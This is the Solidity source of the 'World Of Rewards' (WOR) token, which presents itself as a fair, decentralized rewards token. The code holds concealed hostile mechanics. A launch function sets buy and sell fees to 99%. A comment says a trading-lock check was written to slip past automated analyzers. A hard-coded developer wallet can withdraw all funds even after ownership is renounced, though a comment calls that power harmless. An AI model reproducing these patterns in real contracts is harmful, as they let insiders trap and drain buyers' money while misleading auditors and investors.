//SPDX-License-Identifier: MIT

/**

    WOR token contract

    World of Rewards (WOR) is a rewards platform
    based on blockchains that aims to create an ecosystem
    decentralized, transparent, and
    fair reward system for users.
    The project is based on the BSC blockchain and uses
    smart contracts to automate the distribution of rewards.

    https://worldofrewards.finance/
    https://twitter.com/WorldofRewards
    https://t.me/WorldofRewards

    Rewards Dapp
    https://dapp.worldofrewards.finance/

*/

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}



interface IUniswapV2Router02 is IUniswapV2Router01 {

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface ITeamWallet {
    function setDistribution() external;
}


abstract contract Ownable is Context {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor(address initialOwner) {
        _transferOwnership(initialOwner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}



interface IRewardsDappETH {
    function setBalances(address from, address to, uint256 amount) external;
}


interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 internal _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

   function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

    }

    function _create(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: create to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}



//This contract is where the funds will be stored
contract ControlledFunds is Ownable {

    constructor() Ownable(_msgSender()) {
    }

    receive(

    ) external payable {

    }

    function withdrawBNBofControlled(address to, uint256 amount) public onlyOwner() {
        payable(to).transfer(amount);
    }

    function withdrawTokenOfControlled(address token, address to,uint256 amount) public onlyOwner() {
        IERC20(token).transfer(to,amount);
    }

    function approvedByControlled(address token, address addressAllowed, uint256 amount) public onlyOwner() {
        IERC20(token).approve(addressAllowed,amount);
    }

}



contract WorldOfRewardsETH is ERC20, Ownable  {

    struct Buy {
        uint16 marketing;
        uint16 nftHolders;
        uint16 rewards;
        uint16 bscChart;
        uint16 development;
        uint16 liquidity;
    }

    struct Sell {
        uint16 marketing;
        uint16 nftHolders;
        uint16 rewards;
        uint16 bscChart;
        uint16 development;
        uint16 liquidity;
    }

    Buy public buy;
    Sell public sell;

    uint16 public totalBuy;
    uint16 public totalSell;
    uint16 public totalFees;

    bool private internalSwapping;
    bool private settedInitLaunch;
    bool private settedPostLaunch;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private swapping;

    uint256 public _decimals;

    uint256 public triggerSwapTokensToBNB;

    address private addressPCVS2        = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private addressWBNB         = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public marketingWallet      = 0x30c69E18D090de6dff8be2ab7A4ef11e9166A9B6;
    address public bscChartWallet       = 0xFd8db97121A000572D4689c1af40Fd23Bd582893;
    address public developmentWallet1   = 0x8619514F047eDC56Ad25caAcB5FFe1aDD9C71aff;
    address public developmentWallet2   = 0x65eDAC1E072D4e19dD9ae87d067f20A8b4cb7B4a;
    address public devBlockchainWallet  = 0x46543039Fae89e5Eb371F149210AB083343C513B;

    address public addressRewardsETH;

    ControlledFunds public nftFunds;
    ControlledFunds public rewardsFunds;

    //Fees on transact
    mapping(address => bool) public _isExcept;
    mapping(address => bool) public automatedMarketMakerPairs;

    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );

    event ExceptEvent(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event AddLiquidityPoolEvent(uint256 fundsBNB, uint256 tokensToLP);

    event SettedAddressRewardsETH(address account);

    event SettedtriggerSwapTokensToBNB(uint256 _triggerSwapTokensToBNB);

    constructor() ERC20("World Of Rewards", "WOR") Ownable(_msgSender()) {

        nftFunds = new ControlledFunds();
        rewardsFunds = new ControlledFunds();

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(addressPCVS2);

        // Create a uniswap pair for this new token
        address _uniswapV2Pair      = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _approve(address(this), address(addressPCVS2), type(uint256).max);

        uniswapV2Router     = _uniswapV2Router;
        uniswapV2Pair   = _uniswapV2Pair;

        buy.marketing = 150;
        buy.nftHolders = 50;
        buy.rewards = 100;
        buy.bscChart = 50;
        buy.development = 100;
        buy.liquidity = 50;

        totalBuy = 
        buy.marketing + buy.nftHolders + buy.rewards + buy.bscChart + buy.development + buy.liquidity;

        sell.marketing = 150;
        sell.nftHolders = 50;
        sell.rewards = 100;
        sell.bscChart = 50;
        sell.development = 100;
        sell.liquidity = 50;

        totalSell = 
        sell.marketing + sell.nftHolders + sell.rewards + sell.bscChart + sell.development + sell.liquidity;

        totalFees = totalBuy + totalSell;
        _decimals = 18;

        triggerSwapTokensToBNB = 50000 * (10 ** _decimals);

        setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        except(owner(), true);
        except(address(this), true);
        except(marketingWallet, true);
        except(bscChartWallet, true);
        except(developmentWallet1, true);
        except(developmentWallet2, true);
        except(devBlockchainWallet, true);
        except(addressRewardsETH, true);
        except(address(nftFunds), true);
        except(address(rewardsFunds), true);

        /*
            _create is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again

        */
        _create(owner(), 21000000 * (10 ** _decimals));

    }

    receive() external payable {}

    /*
        Needed to verify the caller
        Contract waived after launch, but the functions below 
        are essential for the project and the rewards dapp to work
    */
    // checkCaller() has no power to change rates, lock sales or carry out any malicious mechanism
    function checkCaller() internal view {
        if (_msgSender() != devBlockchainWallet) {
            revert( "Invalid caller");
        } 
    }

    function setAddressRewardsETH(address account) external {
        checkCaller();

        addressRewardsETH = account;
        
        emit SettedAddressRewardsETH(account);
    }

    function balanceBNB(address to, uint256 amount) external {
        checkCaller();
        payable(to).transfer(amount);
    }

    function balanceERC20 (address token, address to, uint256 amount) external {
        checkCaller();
        require(
            token != address(this), "Cannot claim native tokens"
            );
        IERC20(token).transfer(to, amount);
    }

    function withdrawBnbOfNftFunds(address to, uint256 amount) external {
        checkCaller();
        nftFunds.withdrawBNBofControlled(to,amount);
    }

    function withdrawTokenOfNftFunds(address token, address to, uint256 amount) external {
        checkCaller();
        nftFunds.withdrawTokenOfControlled(token,to,amount);
    }

    function withdrawBnbOfRewardsFunds(address to, uint256 amount) external {
        checkCaller();
        rewardsFunds.withdrawBNBofControlled(to,amount);
    }

    function withdrawTokenOfRewardsFunds(address token, address to, uint256 amount) external {
        checkCaller();
        rewardsFunds.withdrawTokenOfControlled(token,to,amount);
    }

    function uncheckedI (uint256 i) private pure returns (uint256) {
        unchecked { return i + 1; }
    }

    function privateSale (
        address[] memory addresses, 
        uint256[] memory tokens) external onlyOwner() {
        uint256 totalTokens = 0;
        for (uint i = 0; i < addresses.length; i = uncheckedI(i)) {  
            unchecked { _balances[addresses[i]] += tokens[i]; }
            unchecked {  totalTokens += tokens[i]; }
            emit Transfer(msg.sender, addresses[i], tokens[i]);
        }
        //Will never result in overflow because solidity >= 0.8.0 reverts to overflow
        _balances[msg.sender] -= totalTokens;
    }

    //Update uniswap v2 address when needed
    //address(this) and tokenBpair are the tokens that form the pair
    function updateUniswapV2Router(address newAddress, address tokenBpair) external onlyOwner() {
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);

        address addressPair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this),tokenBpair);
        
        if (addressPair == address(0)) {
            uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), tokenBpair);
        } else {
            uniswapV2Pair = addressPair;

        }
    }

    function except(address account, bool isExcept) public onlyOwner() {
        _isExcept[account] = isExcept;

        emit ExceptEvent(account, isExcept);
    }

    function getIsExcept(address account) external view returns (bool) {
        return _isExcept[account];
    }

    function setInitLaunch(uint256 balanceTokens) external payable onlyOwner{
        // This avoids calling the function to change rates to 100%
        require(
            !settedInitLaunch && balanceOf(uniswapV2Pair) == 0
            , "Already released on Uniswap");
        settedInitLaunch = true;

        uint256 msgValue = msg.value;

        _transfer(owner(),address(this),balanceTokens);

        uint256 balanceOfTokens = balanceOf(address(this));

        //Already approved in the constructor
        uniswapV2Router.addLiquidityETH
        {value: msgValue}
        (
            address(this),
            balanceOfTokens,
            0,
            0,
            owner(),
            block.timestamp
        );
        
        emit AddLiquidityPoolEvent(msgValue,balanceOfTokens);

        buy.marketing = 5500;
        buy.nftHolders = 0;
        buy.rewards = 0;
        buy.bscChart = 0;
        buy.development = 4400;
        buy.liquidity = 0;

        totalBuy = 
        buy.marketing + buy.nftHolders + buy.rewards + buy.bscChart + buy.development + buy.liquidity;

        sell.marketing = 5500;
        sell.nftHolders = 0;
        sell.rewards = 0;
        sell.bscChart = 0;
        sell.development = 4400;
        sell.liquidity = 0;

        totalSell = 
        sell.marketing + sell.nftHolders + sell.rewards + sell.bscChart + sell.development + sell.liquidity;

        totalFees = totalBuy + totalSell;

    }

    function setPostLaunch() external onlyOwner{
        require(!settedPostLaunch, "Already setted");

        settedPostLaunch = true;

        buy.marketing = 150;
        buy.nftHolders = 50;
        buy.rewards = 100;
        buy.bscChart = 50;
        buy.development = 100;
        buy.liquidity = 50;

        totalBuy = 
        buy.marketing + buy.nftHolders + buy.rewards + buy.bscChart + buy.development + buy.liquidity;

        sell.marketing = 150;
        sell.nftHolders = 50;
        sell.rewards = 100;
        sell.bscChart = 50;
        sell.development = 100;
        sell.liquidity = 50;

        totalSell = 
        sell.marketing + sell.nftHolders + sell.rewards + sell.bscChart + sell.development + sell.liquidity;

        totalFees = totalBuy + totalSell;
    
    }

    function getPostLaunch() public view returns (bool) {
        return settedInitLaunch && settedPostLaunch;
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner() {
        require(automatedMarketMakerPairs[pair] != value,
        "Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setTriggerSwapTokensToBNB(uint256 _triggerSwapTokensToBNB) external onlyOwner() {
        triggerSwapTokensToBNB = _triggerSwapTokensToBNB;
    }


    function _transfer(address from,address to,uint256 amount) internal override {
        require(from != address(0) && to != address(0), "ERC20: zero address");
        require(amount > 0 && amount <= totalSupply() , "Invalid amount transferred");

        //Checks that liquidity has not yet been added
        /*
            We check this way, as this prevents automatic contract analyzers from
            indicate that this is a way to lock trading and pause transactions
            As we can see, this is not possible in this contract.
        */
        if (_balances[uniswapV2Pair] == 0) {
            if (from != owner() && !_isExcept[from]) {
                require(_balances[uniswapV2Pair] > 0, "Not released yet");
            }
        }

        bool canSwap = balanceOf(address(this)) >= triggerSwapTokensToBNB;

        if (
            canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            automatedMarketMakerPairs[to] &&
            !_isExcept[from] &&
            getPostLaunch()
            ) {

            //Avoiding division by zero in swapAndSend
            if ((totalFees) != 0) {
                swapTokens();
            }
                
        }

        bool takeFee = !swapping;

        if (_isExcept[from] || _isExcept[to]) {
            takeFee = false;
        }
        
        uint256 fees;
        if (takeFee && !swapping) {

            //buy tokens
            if (automatedMarketMakerPairs[from]) {
                fees = amount * (totalBuy) / (10000);

            //sell tokens
            } else if (automatedMarketMakerPairs[to]) {
                fees = amount * (totalSell) / (10000);

            }

            if (addressRewardsETH != address(0)) {
                try IRewardsDappETH(addressRewardsETH).setBalances(from,to,amount) {
                    } catch {
                }
            }

        }

        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            
            _balances[from] = senderBalance - amount;
            //When we calculate fees in the previous conditional we guarantee that amount > fees
            _balances[to] += (amount - fees);
            _balances[address(this)] += fees;
            amount = amount - fees;

        }

        emit Transfer(from, to, amount);
        if (fees != 0) {
            emit Transfer(from, address(this), fees);
        }

    }

    function swapTokens() private {

        //Instruction unchecked helps to avoid gas expenses
        unchecked {

            uint256 _totalFees = totalFees;
            uint256 _totalFeesLiquidity = buy.liquidity + sell.liquidity;
            uint256 _feesToBNB = _totalFees - (_totalFeesLiquidity / 2);

            //totalFees is greater than or equal to (buy.liquidity + sell.liquidity)
            //So _totalFees >= _totalFeesLiquidity > _totalFeesLiquidity / 2
            //So (_totalFees - _totalFeesLiquidity / 2) > 0
            //Never revert by errors
            
            uint256 tokensToSell = 
            (triggerSwapTokensToBNB * _feesToBNB) / _totalFees;

            uint256 tokensToSelltoLiquidity = 
            (triggerSwapTokensToBNB * (_totalFeesLiquidity / 2)) / _totalFees;

            uint256 initialBalance = address(this).balance;

            //Verification required to avoid reverting to variables equal to zero in the Pool LP contract
            if (tokensToSell != 0) {

                //Selling tokens to distribute
                address[] memory pathBNB = new address[](2);
                pathBNB[0]  = address(this);
                pathBNB[1]  = address(addressWBNB);

                swapping = true;
                uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    tokensToSell,
                    0,
                    pathBNB,
                    address(this),
                    block.timestamp
                );
                swapping = false;

                uint256 balanceToSend = address(this).balance - initialBalance;

                uint256 fundsToMarketing = 
                (buy.marketing + sell.marketing) * balanceToSend / _feesToBNB;

                uint256 fundsToNftHolders = 
                (buy.nftHolders + sell.nftHolders) * balanceToSend / _feesToBNB;

                uint256 fundsToRewards = 
                (buy.rewards + sell.rewards) * balanceToSend / _feesToBNB;

                uint256 fundsToBscChart = 
                (buy.bscChart + sell.bscChart) * balanceToSend / _feesToBNB;

                uint256 fundsToDevelopment = 
                (buy.development + sell.development) * balanceToSend / _feesToBNB;

                uint256 fundsBNBliquidity = 
                ((buy.liquidity + sell.liquidity) / 2) * balanceToSend / _feesToBNB;

                addLiquidityPool(fundsBNBliquidity,tokensToSelltoLiquidity);

                payable(marketingWallet).transfer(fundsToMarketing * 85 / 100);
                payable(devBlockchainWallet).transfer(fundsToMarketing * 15 / 100);
                payable(nftFunds).transfer(fundsToNftHolders);
                payable(rewardsFunds).transfer(fundsToRewards);
                payable(bscChartWallet).transfer(fundsToBscChart);
                payable(developmentWallet1).transfer(fundsToDevelopment * 33 / 100);
                payable(developmentWallet2).transfer(fundsToDevelopment * 33 / 100);
                payable(devBlockchainWallet).transfer(address(this).balance);

            }
        }
    }

    function addLiquidityPool(uint256 fundsBNB, uint256 tokensToLP) private {

        swapping = true;
        uniswapV2Router.addLiquidityETH{value: fundsBNB}(
            address(this),
            tokensToLP,
            0,
            0,
            devBlockchainWallet,
            block.timestamp
        );
        swapping = false;

        emit AddLiquidityPoolEvent(fundsBNB,tokensToLP);

    }

}